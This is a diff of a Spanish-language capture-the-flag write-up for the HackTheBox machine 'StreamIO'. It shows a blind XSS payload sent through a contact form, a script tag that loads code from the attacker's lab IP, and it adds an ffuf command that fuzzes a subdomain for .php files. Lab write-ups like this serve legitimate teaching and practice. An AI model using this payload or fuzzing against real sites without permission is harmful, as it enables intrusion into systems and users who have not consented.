@@ -81,7 +81,7 @@ https://streamio.htb/
 ```
 
 Vemos que hay una zona de CONTAC US, en la cual se indica al enviar el mensaje hay una persona revisando la incidencia y que envía una respuesta, probaremos a hacer una inyección XSS para ver si esto se acontece
-```js
+```javascript
 <script src="http://10.10.14.116/test"></script>
 ```
 
@@ -95,4 +95,10 @@ También encontramos un subdominio al que podemos acceder
 https://watch.streamio.htb/
 ```
 
+Haremos de nuevo fuzzing en busqueda de archivos .php
+```shell
+ffuf -c -u https://watch.streamio.htb/FUZZ.php -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt
+```
+
+Encontrando un `searc`, `index` y `blocked`, navegaremos a los recursos a ver que encontram
 
